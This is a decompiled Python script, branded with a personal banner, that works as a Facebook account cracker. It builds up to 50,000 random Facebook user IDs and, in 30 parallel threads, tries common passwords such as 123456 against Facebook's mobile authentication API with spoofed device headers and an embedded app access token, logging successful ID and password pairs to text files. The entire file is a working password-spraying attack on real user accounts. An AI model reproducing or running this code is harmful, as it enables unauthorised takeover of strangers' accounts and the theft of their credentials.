# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-06-01 14:33:53.616123
W = '\x1b[97;1m'
R = '\x1b[91;1m'
G = '\x1b[92;1m'
Y = '\x1b[93;1m'
B = '\x1b[94;1m'
P = '\x1b[95;1m'
C = '\x1b[96;1m'
N = '\x1b[0m'
import os
try:
    import requests
except ImportError:
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    os.system('pip install futures')

import os, sys, time, requests, random, platform, base64, subprocess
from concurrent.futures import ThreadPoolExecutor
logo = '\n\x1b[1;92m  \n\xe2\x80\xa2    _______     __  _ __  ___    \xe2\x80\xa2\n\xe2\x80\xa2   / ____\\ \\   / / | /_ |/ _ \\   \xe2\x80\xa2\n\xe2\x80\xa2  | |     \\ \\_/ /  | || | (_) |  \xe2\x80\xa2\n\xe2\x80\xa2  | |      \\   /   | || |\\__, |  \xe2\x80\xa2\n\xe2\x80\xa2  | |____   | | |__| || |  / /   \xe2\x80\xa2\n\xe2\x80\xa2   \\_____|  |_|\\____/ |_| /_/    \xe2\x80\xa2\n\n  \xe2\x80\xa2 https://github.com/JidanXDec \xe2\x80\xa2'

class Main:

    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system('clear')
        print logo
        print ''
        print '\x1b[93;1mHello YASH KUMAR \x1b[0m'
        print '\x1b[1;93;1mYASH IS NOT A NAME ITS BRAND!!\x1b[0m'
        print ''
        print '%s[%s1%s]%s CRACK RANDOM FB  2008-11 %s[Pro]' % (G, G, R, Y, B)
        print '\x1b[1;31m[2] EXIT'
        __SHO = input('\n\x1b[0;91m\xe2\x9e\xa4 \x1b[0;92m Pilih \x1b[0m: ')
        if __SHO in ('', ' '):
            Main()
        elif __SHO in ('1', '01'):
            self.fbtua()
        else:
            exit()

    def fbtua(self):
        x = 111111111
        xx = 999999999
        idx = '100000'
        os.system('clear')
        print logo
        print ''
        limit = int(input('\x1b[97;1m[\xe2\x9e\xa4] choose Id? Limit 50,000: '))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))

            print '\x1b[0;93m[\xe2\x9e\xa4] Berhasil Mengumpukan -> \x1b[0;91m%s\x1b[0;97m' % len(self.id)
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print '%s[\xe2\x9e\xa4] GUNAKAN SANDI INI, SILAHKAN SALIN DAN TEMPEL DI BAWAH       [\xe2\x9e\xa4] %s786786,123456,1234567,123456789' % (G, Y)
                listpass = input('%s[\xe2\x9e\xa4] Masukan Sandi :%s ' % (G, Y))
                if len(listpass) <= 5:
                    exit('\n%s[\xe2\x9e\xa4] SANDI MINNIMAL 6 KARAKTER' % B)
                print '%s[\xe2\x9e\xa4] CRACK MENGGUNAKAN SANDI -> [\x1b[0;91m%s\x1b[0;93m]' % (G, listpass)
                print '\n%s[\xe2\x9e\xa4] HASIL OK DISIMPAN DI -> ok.txt' % G
                print '%s[\xe2\x9e\xa4] HASIL CP DISIMPAN DI -> cp.txt' % C
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(','))

            exit('\n\n[\xe2\x9e\xa4] CRACK SELESAI...')
        except Exception as e:
            exit(str(e))

    def api(self, uid, pwx):
        ua = random.choice([
         'Mozilla/5.0 (BlackBerry; U; BlackBerry 9700; en) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+]Mozilla/5.0 (BlackBerry; U; BlackBerry 9700; en) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+]Mozilla/5.0 (Linux; Android 6.0; CAM-L21 Build/HUAWEICAM-L21) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36]NokiaC3-00/5.0 (07.20) Profil/MIDP-2.1 Konfigurasi/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, seperti Gecko) Safari/420+]'])
         
         
         
         
        sys.stdout.write('\r\r%sJidanXDec \xe2\x9e\xa4 %s/%s -> \x1b[0;97m CP:%s \x1b[0;97m OK:%s ' % (W, self.loop, len(self.id), len(self.ok), len(self.cp)))
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 
               'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'user-agent': ua, 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            response = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r\x1b[0;93mJidanXDec \xe2\x9e\xa4 CP|%s | %s\x1b[0;93m         ' % (uid, pw)
                self.ok.append('%s|%s' % (uid, pw))
                open('cp.txt', 'a').write('  * --> %s|%s\n' % (uid, pw))
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                print '\r\x1b[92;1mJidanXDec \xe2\x9e\xa4 OK|%s | %s\x1b[92;1m         ' % (uid, pw)
                self.cp.append('%s|%s' % (uid, pw))
                open('ok.txt', 'a').write('  * --> %s|%s\n' % (uid, pw))
                break
            else:
                continue

        self.loop += 1


try:
    Main()
except Exception as e:
    exit(str(e))
